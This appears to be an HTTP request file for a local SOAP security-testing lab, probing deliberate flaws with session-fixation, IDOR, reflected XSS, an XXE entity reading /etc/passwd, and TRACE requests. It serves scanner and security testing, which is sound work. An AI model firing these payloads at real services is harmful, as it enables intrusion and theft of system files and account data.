### Vulnerable WSDL
GET http://127.0.0.1:8089/soap?wsdl

### Vulnerable Login with session fixation
POST http://127.0.0.1:8089/soap
Content-Type: text/xml
SOAPAction: Login
X-Fixed-Session-Id: attacker-controlled-session

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
  <soap:Body>
    <lab:Login>
      <lab:Username>user_apollo</lab:Username>
      <lab:Password>userpass1</lab:Password>
    </lab:Login>
  </soap:Body>
</soap:Envelope>

### IDOR: user_apollo requesting admin account
POST http://127.0.0.1:8089/soap
Content-Type: text/xml
SOAPAction: GetAccount
Authorization: Bearer {{access_token}}

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
  <soap:Body>
    <lab:GetAccount>
      <lab:AccountId>9001</lab:AccountId>
    </lab:GetAccount>
  </soap:Body>
</soap:Envelope>

### Unsafe reflection
POST http://127.0.0.1:8089/soap
Content-Type: text/xml
SOAPAction: SearchUser
Authorization: Bearer {{access_token}}

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
  <soap:Body>
    <lab:SearchUser>
      <lab:Query><![CDATA["><script>alert(1)</script>]]></lab:Query>
    </lab:SearchUser>
  </soap:Body>
</soap:Envelope>

### DOCTYPE / ENTITY probe
POST http://127.0.0.1:8089/soap
Content-Type: text/xml
SOAPAction: SearchUser

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:lab="urn:soap-dast-lab">
  <soap:Body>
    <lab:SearchUser>
      <lab:Query>&xxe;</lab:Query>
    </lab:SearchUser>
  </soap:Body>
</soap:Envelope>

### TRACE reflection
TRACE http://127.0.0.1:8089/verbs
X-Probe: reflected-by-vulnerable-server
